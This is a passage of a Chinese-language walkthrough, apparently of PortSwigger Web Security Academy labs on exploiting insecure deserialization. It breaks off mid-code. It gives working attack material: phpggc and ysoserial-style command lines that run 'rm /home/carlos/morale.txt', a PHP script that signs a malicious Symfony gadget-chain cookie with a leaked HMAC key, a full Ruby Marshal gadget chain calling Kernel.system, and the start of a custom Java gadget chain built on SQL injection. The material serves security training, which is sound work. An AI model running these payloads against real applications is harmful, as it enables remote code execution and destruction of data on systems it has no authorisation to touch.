<span class="token number">2</span>. <span class="token variable"><span class="token variable">`</span>CommonsCollections4<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是指定要使用的攻击载荷类型。在这种情况下，选择了CommonsCollections4库。

<span class="token number">3</span>. <span class="token variable"><span class="token variable">`</span>'rm /home/carlos/morale.txt'<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是要执行的命令，即删除<span class="token variable"><span class="token variable">`</span>/home/carlos/morale.txt<span class="token variable">`</span></span>文件。您可以将此命令替换为任何您想在目标系统上执行的有效命令。

<span class="token number">4</span>. <span class="token variable"><span class="token variable">`</span><span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span><span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是将前面生成的攻击载荷输出进行Base64编码的管道操作符，并且使用<span class="token variable"><span class="token variable">`</span><span class="token parameter variable">-w</span> <span class="token number">0</span><span class="token variable">`</span></span>参数指定不换行输出。

<span class="token number">5</span>. <span class="token variable"><span class="token variable">`</span><span class="token operator">></span> cookieToUse.txt<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是将Base64编码的攻击载荷输出重定向到文件cookieToUse.txt中。</code></pre></li>
<li><p>替换burp拦截的cookie，并url编码<img
src="https://s2.loli.net/2023/07/06/qjSxlp95JoK3ei8.png"
alt="image-20230706220331638" /></p></li>
</ol>
<h5
id="lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-1">Lab:
Exploiting PHP deserialization with a pre-built gadget chain</h5>
<ul>
<li><p><strong>前置</strong></p>
<ul>
<li><p><code>PHP Generic Gadget Chains</code>（PHP通用gadget链）是针对PHP语言的一种工具，用于利用不安全的反序列化漏洞。这个工具的目的是生成一系列漏洞利用组件链，用于构造恶意的序列化数据，以实现特定的攻击目标。</p>
<p>PHPGGC的工作原理是通过分析目标应用<strong>程序的源代码和依赖的库</strong>，识别出其中可能存在的可利用的gadget
chain。然后，它根据这些gadget
chain自动生成相应的序列化数据，供攻击者使用。</p>
<p>PHPGGC支持的攻击类型包括<strong>远程代码执行、文件删除、命令执行</strong>等。它提供了一系列预定义的gadget
chain，攻击者可以根据需要选择适合的链条来构造恶意的序列化数据。</p>
<p>使用PHPGGC可以简化利用不安全的反序列化漏洞的过程，攻击者无需手动构造复杂的序列化数据，而是可以直接使用<strong>预先生成的gadget
chain</strong>。这使得利用漏洞变得更加容易和快速。</p>
<p>需要注意的是，PHPGGC只是一种工具，攻击者仍然需要对目标应用程序进行仔细分析和测试，以确定适合的gadget
chain和攻击方式。此外，使用PHPGGC进行攻击仍然需要对目标应用程序的漏洞进行评估和权限获取。</p></li>
<li><p>在该实验中，<code>令牌（token）</code>是指包含序列化的PHP对象的数据，用于在会话cookie中传递。令牌本身是未经签名的数据。</p>
<p><code>签名</code>是为了确保令牌的完整性和身份验证。在该实验中，使用了SHA-1
HMAC哈希算法对令牌进行签名，使用一个密钥来生成数字签名。</p>
<p>数字签名是通过将令牌与密钥进行哈希计算而生成的。计算过程使用了HMAC算法，其中密钥用于对令牌进行加密哈希。生成的数字签名被添加到令牌中作为签名字段。</p>
<p>验证签名时，服务器会使用相同的密钥和哈希算法对令牌进行计算，并将计算得到的签名与令牌中的签名字段进行比较。如果两者匹配，说明令牌的完整性得到了验证，没有被篡改过。</p></li>
</ul></li>
</ul>
<ol type="1">
<li><p>Cookie中包含序列化对象，<strong>token</strong>值<img
src="https://s2.loli.net/2023/07/07/cxHzYS8EVFuvqOw.png"
alt="image-20230707034215153" /></p></li>
<li><p>更改其中的<code>username</code>为carlos,报错<img
src="https://s2.loli.net/2023/07/07/AwbzOhyLsDG3tuo.png"
alt="image-20230707034357474" /></p>
<p><strong>报错分析</strong>：
后端使用了php的Symfony4.3.6框架，此框架存在<code>RCE（Remote Code Execution，远程代码执行）gadget链</code></p></li>
<li><p>同时注意到资产下的这个文件，请求这个文件<img
src="https://s2.loli.net/2023/07/07/jDEegGfAlr3dkXR.png"
alt="image-20230707034641845" /></p>
<p>注意到一个<strong>私钥变量</strong><img
src="https://s2.loli.net/2023/07/07/GQcIsxEV5an9ekz.png"
alt="image-20230707034740601" /></p></li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc工具</a></p>
<p>使用PHPGGC生成对象是为了<strong>利用</strong>Symfony框架中的远程代码执行（RCE）漏洞。PHPGGC是一个工具，它可以<strong>生成</strong>包含特定漏洞利用链的恶意序列化对象。通过使用PHPGGC生成的对象，我们可以利用Symfony框架的漏洞来执行任意的命令或操作。</p>
<p>在这种情况下，通过生成特定的恶意序列化对象，我们可以构造一个包含远程代码执行的利用链，以删除Carlos的morale.txt文件。由于漏洞的存在，当目标网站对包含恶意对象的请求进行反序列化时，恶意代码将被执行，从而导致目标文件被删除。</p>
<p>通过使用PHPGGC生成恶意对象，我们能够利用现有的漏洞利用链，而无需手动构造复杂的序列化数据。这简化了利用过程，并提供了一种快速且可靠的方式来利用特定的漏洞。</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">git clone https:&#x2F;&#x2F;github.com&#x2F;ambionics&#x2F;phpggc.git</code></pre></li>
<li><p>使用phpggc</p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">.&#x2F;phpggc Symfony&#x2F;RCE4 exec &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64 -w 0 &gt; CookieSymfonyRCE4.txt</code></pre>
<p>结果<img src="https://s2.loli.net/2023/07/07/Us45TB8RmctlMQw.png"
alt="结果" /></p></li>
<li><p>构造一个有效的、经过签名的Cookie</p>
<pre class="language-php" data-language="php"><code class="language-php"># 脚本
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"OBJECT-GENERATED-BY-PHPGGC"</span><span class="token punctuation">;</span>
<span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"</span><span class="token punctuation">;</span>
<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;"token":"'</span> <span class="token operator">.</span> <span class="token variable">$object</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'","sig_hmac_sha1":"'</span> <span class="token operator">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span>

<span class="token comment">#套用</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="</span><span class="token punctuation">;</span>
<span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"6jo0phdc8u0sc4pepgxpg1q3o0ouz7r5"</span><span class="token punctuation">;</span>
<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;"token":"'</span> <span class="token operator">.</span> <span class="token variable">$object</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'","sig_hmac_sha1":"'</span> <span class="token operator">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span></span></code></pre>
<p><strong>脚本分析</strong>：</p>
<p>这段PHP代码用于构造一个有效的、经过签名的Cookie，其中包含了利用不安全的反序列化漏洞的恶意对象：</p>
<ul>
<li><code>$object = "OBJECT-GENERATED-BY-PHPGGC";</code>：这行代码指定了通过PHPGGC工具生成的恶意对象的字符串表示。实际应用中，你需要将这部分替换为真正的恶意对象的字符串表示。</li>
<li><code>$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";</code>：这行代码指定了从phpinfo.php文件中泄露的秘密密钥，用于对Cookie进行签名。实际应用中，你需要将这部分替换为从phpinfo.php中获取的实际秘密密钥。</li>
<li><code>$cookie = urlencode('&#123;"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"&#125;');</code>：这行代码构造了一个包含恶意对象和签名的Cookie字符串。使用<code>urlencode()</code>函数对整个字符串进行URL编码，以确保其中的特殊字符被正确处理。</li>
<li><code>echo $cookie;</code>：这行代码将构造的Cookie字符串输出到控制台。</li>
</ul></li>
<li><p>将结果替代原来的cookie</p></li>
</ol>
<h5
id="lab-exploiting-ruby-deserialization-using-a-documented-gadget-chain-1">Lab:
Exploiting Ruby deserialization using a documented gadget chain</h5>
<ol type="1">
<li><p><a
target="_blank" rel="noopener" href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">ruby反序列化博客</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://www.onlinegdb.com/">在线工具onlinegdb</a></p>
<pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># Autoload the required classes</span>
Gem<span class="token double-colon punctuation">::</span>SpecFetcher
Gem<span class="token double-colon punctuation">::</span>Installer

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'base64'</span></span>  <span class="token comment">#缺少则报错：main.rb:38:in `&lt;main>': uninitialized constant Base64 (NameError)</span>

<span class="token comment"># prevent the payload from running when we Marshal.dump it</span>
<span class="token keyword">module</span> <span class="token class-name">Gem</span>
  <span class="token keyword">class</span> <span class="token class-name">Requirement</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">marshal_dump</span></span>
      <span class="token punctuation">[</span><span class="token variable">@requirements</span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

wa1 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>Kernel<span class="token punctuation">,</span> <span class="token symbol">:system</span><span class="token punctuation">)</span>

rs <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token punctuation">.</span>allocate
rs<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@sets'</span></span><span class="token punctuation">,</span> wa1<span class="token punctuation">)</span>
rs<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@git_set'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"rm /home/carlos/morale.txt"</span></span><span class="token punctuation">)</span>

wa2 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>rs<span class="token punctuation">,</span> <span class="token symbol">:resolve</span><span class="token punctuation">)</span>

i <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token double-colon punctuation">::</span>Entry<span class="token punctuation">.</span>allocate
i<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@read'</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
i<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@header'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"aaa"</span></span><span class="token punctuation">)</span>


n <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span>BufferedIO<span class="token punctuation">.</span>allocate
n<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
n<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@debug_output'</span></span><span class="token punctuation">,</span> wa2<span class="token punctuation">)</span>

t <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token punctuation">.</span>allocate
t<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>

r <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Requirement<span class="token punctuation">.</span>allocate
r<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@requirements'</span></span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>

payload <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">[</span>Gem<span class="token double-colon punctuation">::</span>SpecFetcher<span class="token punctuation">,</span> Gem<span class="token double-colon punctuation">::</span>Installer<span class="token punctuation">,</span> r<span class="token punctuation">]</span><span class="token punctuation">)</span>
puts Base64<span class="token punctuation">.</span>encode64<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre></li>
<li><p>结果整理</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token builtin class-name">echo</span> <span class="token string">"ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ=="</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span>
<span class="token assign-left variable">ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ</span><span class="token operator">==</span>

<span class="token comment"># 解析</span>
<span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span><span class="token variable"><span class="token variable">`</span> 是一个 Linux 命令，用于从文本中删除换行符和回车符。

- <span class="token variable">`</span></span><span class="token function">tr</span><span class="token variable"><span class="token variable">`</span> 是 <span class="token variable">`</span></span>translate<span class="token variable"><span class="token variable">`</span> 的缩写，用于转换或删除字符。
- <span class="token variable">`</span></span>-d<span class="token variable"><span class="token variable">`</span> 是 <span class="token variable">`</span></span>delete<span class="token variable"><span class="token variable">`</span> 的缩写，表示删除指定的字符。
- <span class="token variable">`</span></span><span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span><span class="token variable"><span class="token variable">`</span> 是要删除的字符集。<span class="token variable">`</span></span><span class="token punctuation">\</span>n<span class="token variable"><span class="token variable">`</span> 表示换行符，<span class="token variable">`</span></span><span class="token punctuation">\</span>r<span class="token variable"><span class="token variable">`</span> 表示回车符。

因此，<span class="token variable">`</span></span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span>` 命令会将输入的文本中的换行符和回车符删除，并输出删除后的文本。这个命令在处理文本文件时常用，可以去除多余的换行符和回车符，使文本更加整洁。</code></pre></li>
</ol>
<h5
id="lab-developing-a-custom-gadget-chain-for-java-deserialization-1">Lab:
Developing a custom gadget chain for Java deserialization</h5>
<ol type="1">
<li><p>Cookie中包含序列化对象</p></li>
<li><p>发现 <code>/backup/</code>文件夹<img
src="https://s2.loli.net/2023/07/07/wRYP2vfm3WIQEcd.png"
alt="image-20230707232819755" /></p>
<p>查看ProducrTemplate.java</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">data<span class="token punctuation">.</span>productcatalog</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">common<span class="token punctuation">.</span>db<span class="token punctuation">.</span></span><span class="token class-name">JdbcConnectionBuilder</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductTemplate</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> id<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token class-name">Product</span> product<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ProductTemplate</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>
    <span class="token punctuation">&#123;</span>
        inputStream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">JdbcConnectionBuilder</span> connectionBuilder <span class="token operator">=</span> <span class="token class-name">JdbcConnectionBuilder</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>
                <span class="token string">"org.postgresql.Driver"</span><span class="token punctuation">,</span>
                <span class="token string">"postgresql"</span><span class="token punctuation">,</span>
                <span class="token string">"localhost"</span><span class="token punctuation">,</span>
                <span class="token number">5432</span><span class="token punctuation">,</span>
                <span class="token string">"postgres"</span><span class="token punctuation">,</span>
                <span class="token string">"postgres"</span><span class="token punctuation">,</span>
                <span class="token string">"password"</span>
        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withAutoCommit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">&#123;</span>
            <span class="token class-name">Connection</span> connect <span class="token operator">=</span> connectionBuilder<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM products WHERE id = '%s' LIMIT 1"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Statement</span> statement <span class="token operator">=</span> connect<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            product <span class="token operator">=</span> <span class="token class-name">Product</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">Product</span> <span class="token function">getProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> product<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 这种直接将用户提供的值插入SQL查询语句中的方式存在安全风险，容易受到SQL注入攻击</span></code></pre></li>
<li><p>instantiate a <code>ProductTemplate</code></p>
<p><a
target="_blank" rel="noopener" href="https://github.com/PortSwigger/serialization-examples/tree/master/java/solution">工具</a></p>
<p>将 <code>id</code>替换成payload</p>
<pre class="language-java" data-language="java"><code class="language-java"># main<span class="token punctuation">.</span>java
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">data<span class="token punctuation">.</span>productcatalog<span class="token punctuation">.</span></span><span class="token class-name">ProductTemplate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ProductTemplate</span> originalObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProductTemplate</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> serializedObject <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>originalObject<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Serialized object: "</span> <span class="token operator">+</span> serializedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ProductTemplate</span> deserializedObject <span class="token operator">=</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>serializedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deserialized object ID: "</span> <span class="token operator">+</span> deserializedObject<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Serializable</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

